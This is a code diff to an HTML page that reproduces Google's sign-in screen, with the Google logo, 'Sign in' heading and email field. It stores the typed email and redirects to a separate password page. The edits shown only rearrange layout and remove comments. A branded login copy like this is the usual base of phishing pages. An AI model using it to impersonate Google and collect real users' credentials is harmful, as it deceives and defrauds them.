@@ -11,7 +11,7 @@
   <div class="card">
     <div class="logo">
       <!-- Google G logo -->
-      <svg width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" style="margin:auto; display:block;">
+      <svg viewBox="0 0 48 48" aria-hidden="true">
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
         <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
         <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -19,15 +19,17 @@
       </svg>
     </div>
 
-    <h1>Sign in</h1>
-    <p class="subtitle">to continue</p>
+    <div class="content">
+      <h1>Sign in</h1>
+      <p class="subtitle">to continue</p>
 
-    <input type="email" id="emailInput" placeholder="Email or phone" />
-    <div class="error-message" id="emailError"></div>
+      <input type="email" id="emailInput" placeholder="Email or phone" />
+      <div class="error-message" id="emailError"></div>
 
-    <a href="#" class="link">Forgot email?</a>
+      <a href="#" class="link">Forgot email?</a>
 
-    <button onclick="handleNext()">Next</button>
+      <button onclick="handleNext()">Next</button>
+    </div>
   </div>
 
   <script>
@@ -41,10 +43,7 @@
         return;
       }
 
-      // Clear error
       errorDiv.textContent = "";
-
-      // Save email for password page
       localStorage.setItem("userEmail", email);
       window.location.href = "password.html";
     }
